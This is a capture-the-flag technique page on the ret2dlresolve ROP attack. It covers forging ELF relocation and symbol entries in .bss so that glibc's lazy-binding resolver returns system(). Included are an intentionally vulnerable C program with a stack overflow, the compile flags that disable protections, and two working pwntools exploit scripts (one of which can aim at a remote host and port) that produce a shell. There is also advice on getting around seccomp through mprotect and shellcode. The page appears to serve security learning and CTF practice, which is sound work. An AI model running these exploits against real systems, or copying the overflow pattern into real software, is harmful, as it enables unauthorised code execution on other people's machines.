---
title: "ret2dlresolve - Forging the Lazy Binding Resolver With No Leak"
category: pwn
subcategory: rop
type: technique
tags: [ret2dlresolve, dlresolve, rop, dynamic-linking, plt, got, dynsym, dynstr, rel-plt, partial-relro, full-relro, bind-now, aslr, nx, read, system, pwntools, ropgadget, readelf, objdump]
difficulty: hard
summary: "No leak, no win(), no output primitive. Forge Elf_Rel/Elf_Sym/strings in .bss and make _dl_runtime_resolve hand you system() itself."
when_to_use:
  - "You have a stack overflow but no way to print anything, so a libc leak is impossible"
  - "checksec says Partial RELRO or No RELRO and the binary is dynamically linked"
  - "The binary has a PLT but no useful libc function already imported (no system, no puts to leak with)"
  - "You have enough overflow room to call read() into .bss and then return once more"
  - "ASLR is on and you refuse to brute force a libc base"
tools: [pwntools, ROPgadget, ropper, readelf, objdump, checksec, gdb, pwndbg]
related: [rop-fundamentals, rop-ret2libc, rop-static-binary, rop-got-overwrite, rop-stack-pivot, mitigation-modern-playbook, mitigation-libc-identification, pwntools-cheatsheet, rop-gadgets-cheatsheet]
---

## TL;DR

Lazy binding means the first call to `puts@plt` does not go to libc. It goes to the dynamic linker,
which is told "resolve relocation number N" and does so by reading structures that live in the
binary's own data. If the binary is Partial RELRO (or No RELRO), nothing stops you from planting a
*fake* relocation, a *fake* symbol and a *fake* symbol name in `.bss` and asking the linker to
resolve `"system"` for you. No libc leak, no ASLR bypass, no GOT read. The linker does the work.

## Recognise it

- `checksec` prints `RELRO: Partial RELRO` (or `No RELRO`) and `PIE: No PIE`.
- The binary is dynamically linked (`file` says `dynamically linked, interpreter /lib/ld-linux...`).
- There is a stack overflow, but the program never prints attacker-controlled data back:
  no `puts(buf)`, no `printf(buf)`, no `write(1, buf, n)` you can aim at the GOT, so no libc leak.
- The imports are useless for a leak: `read`, `alarm`, `setvbuf`, `exit` and nothing else.
- You *can* call `read(0, writable, n)` from a ROP chain -- the only primitive this needs.
- `readelf -d ./vuln | grep BIND_NOW` prints nothing (if it prints `BIND_NOW` / `FLAGS NOW`,
  stop: the technique is dead, see the RELRO section).

## Vulnerable source

```c
/* vuln.c - overflow, no leak, no win function, no system import */
#include <stdio.h>
#include <unistd.h>

void vuln(void) {
    char buf[32];
    puts("say something:");
    read(0, buf, 0x200);          /* 512 bytes into a 32 byte buffer */
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

Build it as the textbook i386 target -- no canary, no PIE, no RELRO at all:

```sh
# 32-bit, lazy binding, writable GOT and writable .dynamic -> the easy case
gcc -fno-stack-protector -no-pie -z norelro -m32 -o vuln32 vuln.c

# the realistic case: Partial RELRO (the modern default). .dynamic is read-only,
# the GOT is still writable, lazy binding still on. ret2dlresolve still works.
gcc -fno-stack-protector -no-pie -z relro -z lazy -m32 -o vuln32_partial vuln.c

# the x86-64 build, for the harder variant discussed below
gcc -fno-stack-protector -no-pie -z relro -z lazy -o vuln64 vuln.c

# confirm what you built, then dump the tables you are about to forge
checksec --file=./vuln32
readelf -d ./vuln32 | head -20    # JMPREL / SYMTAB / STRTAB / VERSYM
readelf -r ./vuln32               # the real .rel.plt
readelf --dyn-syms ./vuln32       # the real .dynsym
```

## Theory

### The four tables

A dynamically linked ELF carries everything the linker needs in four places, all of them findable
from `.dynamic` (`readelf -d`):

| Tag | Section | Contents |
|---|---|---|
| `DT_JMPREL` | `.rel.plt` (i386) / `.rela.plt` (x86-64) | One relocation per lazily-bound import |
| `DT_SYMTAB` | `.dynsym` | One `Elf32_Sym` / `Elf64_Sym` per dynamic symbol |
| `DT_STRTAB` | `.dynstr` | A flat blob of NUL-terminated symbol names |
| `DT_VERSYM` | `.gnu.version` | One 16-bit version index per `.dynsym` entry |

The i386 structures are small, which is the whole reason the technique is so comfortable there:

```c
typedef struct {            /* Elf32_Rel, 8 bytes */
    Elf32_Addr r_offset;    /* where to write the resolved address */
    Elf32_Word r_info;      /* (symbol_index << 8) | relocation_type */
} Elf32_Rel;

typedef struct {            /* Elf32_Sym, 16 bytes */
    Elf32_Word st_name;     /* byte offset into .dynstr */
    Elf32_Addr st_value;    /* 0 is fine */
    Elf32_Word st_size;     /* 0 is fine */
    unsigned char st_info;  /* (BIND << 4) | TYPE -> 0x12 = GLOBAL FUNC */
    unsigned char st_other; /* MUST be 0: non-default visibility skips the lookup */
    Elf32_Half st_shndx;    /* 0 is fine */
} Elf32_Sym;
```

On x86-64 these become `Elf64_Rela` (24 bytes, with `r_addend`, symbol index in the *high* 32 bits
of `r_info`) and `Elf64_Sym` (24 bytes, with `st_name`/`st_info`/`st_other`/`st_shndx` first).

### What the PLT actually does

Every PLT slot is three instructions, and `PLT0` is the trampoline they all fall into:

```
puts@plt:   jmp  dword [puts@got]     ; first call: GOT still points at the next line
            push 0x10                 ; <-- reloc_arg: byte offset into .rel.plt (i386)
            jmp  PLT0

PLT0:       push dword [got+4]        ; the link_map* for this object
            jmp  dword [got+8]        ; _dl_runtime_resolve
```

So `_dl_runtime_resolve(link_map, reloc_arg)` is a function you can call directly, because its two
arguments are simply two pushed stack words. Returning into `PLT0` with your own `reloc_arg` on the
stack is indistinguishable from a real first-time PLT call. On i386 `reloc_arg` is a **byte offset**
into `.rel.plt`; on x86-64 it is an **index** into `.rela.plt`. That difference matters a lot below.

### What the resolver does with it

`_dl_runtime_resolve` saves registers and tail-calls `_dl_fixup(l, reloc_arg)`, which is, stripped
of error handling:

```c
const PLTREL *reloc  = (void *) (D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);
const Elf_Sym *symtab= (void *)  D_PTR(l, l_info[DT_SYMTAB]);
const char  *strtab  = (void *)  D_PTR(l, l_info[DT_STRTAB]);
const Elf_Sym *sym   = &symtab[ELFW(R_SYM)(reloc->r_info)];
Elf_Addr *got_slot   = (void *) (l->l_addr + reloc->r_offset);

assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);   /* type must be 7 */

if (sym->st_other == 0) {                     /* default visibility only */
    result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope, version, ...);
    value  = DL_FIXUP_MAKE_VALUE (result, sym ? sym->st_value + result->l_addr : 0);
}
*got_slot = value;
return value;                                  /* _dl_runtime_resolve jmps here */
```

Four attacker-visible facts fall out of this:

1. `reloc` is `JMPREL + reloc_arg`, and `reloc_arg` is unbounded. Point it into `.bss`.
2. `sym` is `SYMTAB + 16 * index`, and `index` comes from *your* `r_info`. Point it into `.bss`.
3. The name is `STRTAB + sym->st_name`, and `st_name` is *your* 32-bit word. Point it into `.bss`.
4. `_dl_lookup_symbol_x` searches the whole link scope -- which includes **libc**. Asking for
   `"system"` finds libc's `system`, wherever ASLR put it.

Then `_dl_runtime_resolve` jumps to the resolved address with the stack exactly as a normal call
would have it: your fake return address first, then the arguments. So `system("/bin/sh")` falls out
of the same chain, with `"/bin/sh"` being another string you planted in `.bss`.

### Why Full RELRO kills it

Full RELRO (`-z relro -z now`, or `LD_BIND_NOW=1`, or `DF_BIND_NOW` in `DT_FLAGS`) makes the
linker resolve every PLT relocation at load time and then `mprotect` the GOT read-only. `got[2]`
is never populated with `_dl_runtime_resolve`, so `PLT0`'s `jmp [got+8]` goes nowhere, and
`.dynamic` sits inside the read-only `GNU_RELRO` segment. There is no lazy path left to hijack:

```sh
readelf -d ./vuln | grep -E "BIND_NOW|FLAGS"
checksec --file=./vuln     # "RELRO: Full RELRO" == pick another technique
```

Partial RELRO is the sweet spot: `.dynamic` is read-only, but lazy binding is alive and `.bss` is
writable, which is all the forgery needs.

## Attack

1. `checksec` + `readelf -d`: confirm No PIE, Partial/No RELRO, no `BIND_NOW`.
2. Find the overflow offset with `cyclic` / `cyclic_find`.
3. Pick a staging area: `elf.bss()` plus a few hundred bytes of slack.
4. Build a ROP chain that calls `read(0, stage_addr, 0x100)` and then returns into `PLT0` with
   your `reloc_arg` on the stack, followed by a fake return address and the `"/bin/sh"` pointer.
5. Build the second-stage blob: `Elf32_Rel` at `stage_addr` (`r_offset` = any writable address,
   `r_info` = `(idx << 8) | 7`), then an `Elf32_Sym` at a 16-byte-aligned offset from `.dynsym`
   so `idx` is a whole number, then `"system\0"` and `"/bin/sh\0"`.
6. `reloc_arg = fake_rel_addr - jmprel_addr` (i386, byte offset).
7. Send stage one, then stage two, then `interactive()`.

## Exploit

The pwntools way -- `Ret2dlresolvePayload` computes every offset, the alignment padding and the
symbol index for you:

```python
#!/usr/bin/env python3
"""
ret2dlresolve on a no-PIE, Partial RELRO i386 binary with no leak primitive.

Local:   ./exploit.py
Remote:  ./exploit.py HOST PORT
Build:   gcc -fno-stack-protector -no-pie -z relro -z lazy -m32 -o vuln32 vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln32"

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "i386"
context.terminal = ["tmux", "splitw", "-h"]

OFFSET = 44  # 32 byte buffer + alignment + saved ebp; measure with cyclic()


def start():
    """Local process by default, remote when argv gives host/port."""
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *vuln+40\nc\n")
    return process(BINARY)


def main():
    # The forged Elf32_Rel + Elf32_Sym + "system" + "/bin/sh", laid out for us.
    dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

    rop = ROP(elf)
    # Stage 1: drop the forged structures into .bss (dlresolve.data_addr defaults to elf.bss()).
    rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
    # Stage 2: push reloc_arg and fall into PLT0 -> _dl_runtime_resolve.
    rop.ret2dlresolve(dlresolve)

    log.info("data_addr = %#x", dlresolve.data_addr)
    log.info("reloc_index = %#x", dlresolve.reloc_index)
    log.info("chain:\n%s", rop.dump())

    payload = flat({OFFSET: rop.chain()}, filler=b"A")

    io = start()
    io.recvuntil(b"say something:")
    io.sendline(payload)
    io.send(dlresolve.payload)   # consumed by the read() in stage 1
    io.interactive()


if __name__ == "__main__":
    main()
```

And the same thing built by hand, so every byte is accounted for. Feed it the addresses that
`readelf -d` and `readelf -r` print for your binary:

```python
#!/usr/bin/env python3
"""
Hand-rolled i386 ret2dlresolve structure forgery - no Ret2dlresolvePayload.

Run standalone to see the blob and a self-test of the index arithmetic:
    ./forge.py
"""
from pwn import *

context.arch = "i386"
context.log_level = "info"

R_386_JMP_SLOT = 7
STB_GLOBAL_STT_FUNC = 0x12   # (STB_GLOBAL << 4) | STT_FUNC


def forge(stage_addr, dynstr, dynsym, jmprel, writable, symbol=b"system", arg=b"/bin/sh"):
    """Return (blob, reloc_arg, arg_addr) for a fake lazy-binding resolution."""
    # The fake Elf32_Sym must sit at a whole multiple of 16 bytes from .dynsym,
    # because the resolver indexes it as symtab[idx], not as a raw pointer.
    rel_size = 8
    raw_sym_addr = stage_addr + rel_size
    align = (16 - ((raw_sym_addr - dynsym) % 16)) % 16
    sym_addr = raw_sym_addr + align
    sym_index = (sym_addr - dynsym) // 16
    assert (sym_addr - dynsym) % 16 == 0, "fake Elf32_Sym is not 16-byte aligned vs .dynsym"

    str_addr = sym_addr + 16
    arg_addr = str_addr + len(symbol) + 1

    # Elf32_Rel { r_offset, r_info }
    r_info = (sym_index << 8) | R_386_JMP_SLOT
    fake_rel = p32(writable) + p32(r_info)

    # Elf32_Sym { st_name, st_value, st_size, st_info, st_other, st_shndx }
    fake_sym = p32(str_addr - dynstr)       # st_name: offset into .dynstr
    fake_sym += p32(0) + p32(0)             # st_value, st_size
    fake_sym += p8(STB_GLOBAL_STT_FUNC)     # st_info
    fake_sym += p8(0)                       # st_other: MUST be 0
    fake_sym += p16(0)                      # st_shndx

    blob = fake_rel + b"\x00" * align + fake_sym
    blob += symbol + b"\x00"
    blob += arg + b"\x00"

    reloc_arg = stage_addr - jmprel         # i386: a BYTE offset, not an index
    return blob, reloc_arg, arg_addr


def build_chain(plt0, read_plt, pop3_ret, stage_addr, reloc_arg, arg_addr, blob_len):
    """Stage 1 reads the blob into .bss, stage 2 falls into PLT0."""
    chain = p32(read_plt)       # read(0, stage_addr, blob_len)
    chain += p32(pop3_ret)      # cdecl cleanup: discard the 3 arguments
    chain += p32(0) + p32(stage_addr) + p32(blob_len)
    chain += p32(plt0)          # PLT0 pushes link_map, jmps _dl_runtime_resolve
    chain += p32(reloc_arg)     # the value a real PLT stub would have pushed
    chain += p32(0xDEADBEEF)    # fake return address for system()
    chain += p32(arg_addr)      # system's first argument: "/bin/sh"
    return chain


def main():
    # Placeholder addresses. Replace with YOUR binary's values:
    #   readelf -d ./vuln32 -> JMPREL/STRTAB/SYMTAB, readelf -S -> .bss,
    #   objdump -d -j .plt ./vuln32 | head -> PLT0.
    blob, reloc_arg, arg_addr = forge(
        stage_addr=0x0804C000, dynstr=0x08048330, dynsym=0x080481D0,
        jmprel=0x080483C0, writable=0x0804C200,
    )
    chain = build_chain(
        plt0=0x08048400, read_plt=0x08048430, pop3_ret=0x080492F1,
        stage_addr=0x0804C000, reloc_arg=reloc_arg, arg_addr=arg_addr,
        blob_len=len(blob),
    )
    log.success("reloc_arg = %#x (byte offset into .rel.plt)", reloc_arg)
    log.success("arg_addr  = %#x", arg_addr)
    print(hexdump(blob))
    print(hexdump(chain))


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **x86-64 is harder, and the reason is the index.** The PLT pushes a *relocation index*, and
  `_dl_fixup` computes `JMPREL + index * sizeof(Elf64_Rela)` with `sizeof == 24`. To reach `.bss`
  from `.rela.plt` you need an enormous index, and that same index is then used to read
  `vernum[index]` out of `.gnu.version`. That read is far out of bounds and frequently segfaults.
  `Ret2dlresolvePayload` handles amd64, but verify locally before you trust it, and be ready to
  fall back to `rop-ret2csu` plus a leak.
- **`st_other` must be zero.** `_dl_fixup` skips the lookup entirely for non-default visibility,
  and you get whatever garbage was in the GOT slot. If your `.bss` staging area is not zeroed,
  zero it explicitly.
- **Relocation type must be 7.** `R_386_JMP_SLOT` and `R_X86_64_JUMP_SLOT` are both `7`. A modern
  glibc asserts on this and aborts with a clean error message if you get it wrong.
- **16-byte alignment of the fake `Elf32_Sym`.** `(fake_sym - dynsym) % 16 != 0` gives you a
  garbage `st_name` and a wild `strtab + st_name` read. Pad the blob, do not move `.bss`.
- **The old DT_STRTAB overwrite is dead under Partial RELRO.** The pre-2013 variant repointed
  `.dynamic`'s `DT_STRTAB` at a table of your own. `GNU_RELRO` covers `.dynamic` now, so forge
  the `Elf_Sym` instead.
- **`r_offset` must be writable.** The resolved address is written there before the jump.
  Anything in `.bss` or the GOT works; a read-only address segfaults the linker after it already
  did the hard part.
- **"Lazy binding must not have happened yet" is a myth.** You are not reusing an existing
  relocation, you are supplying a brand new one.
- **Version indices.** If `DT_VERSYM` exists, `l->l_versions[vernum[idx] & 0x7fff]` is consulted.
  On i386 with a `.bss`-sized index the read usually lands in mapped memory and yields
  `hash == 0`, making `version` NULL and the lookup unversioned -- exactly what you want.
- **Symbol choice.** `"system"` is the obvious pick, but any libc export works: `"execl"`,
  `"execve"`, `"mprotect"`, `"puts"`. Under seccomp, resolve `"mprotect"` and jump to shellcode
  instead -- see `shellcode-seccomp-orw`.
- **You need two reads, not one.** The chain is stage one, the forged blob is stage two. If the
  program only reads once, pivot into `.bss` first -- see `rop-stack-pivot`.
- **Static binaries have no dynamic linker at all**: no PLT0, no `.dynamic`. Use
  `rop-static-binary`.

## Tools

| Tool | Use |
|---|---|
| `checksec --file=./vuln` | Confirms Partial vs Full RELRO before you waste an hour |
| `readelf -d ./vuln` | `JMPREL`, `SYMTAB`, `STRTAB`, `VERSYM`, and the `BIND_NOW` kill switch |
| `readelf -r ./vuln` | The real `.rel.plt` entries, to copy their `r_info` type byte |
| `readelf --dyn-syms ./vuln` | The real `.dynsym`, to sanity-check your fake entry's shape |
| `objdump -d -j .plt ./vuln` | The address of `PLT0` and each stub's pushed `reloc_arg` |
| `pwntools Ret2dlresolvePayload` | `data_addr`, `payload`, `reloc_index`; pairs with `rop.ret2dlresolve()` |
| `ROPgadget --binary ./vuln` | The `pop ; pop ; pop ; ret` you need for cdecl stack cleanup |
| `gdb` + `pwndbg` | `b _dl_fixup`, then inspect `reloc`, `sym` and `strtab + st_name` |
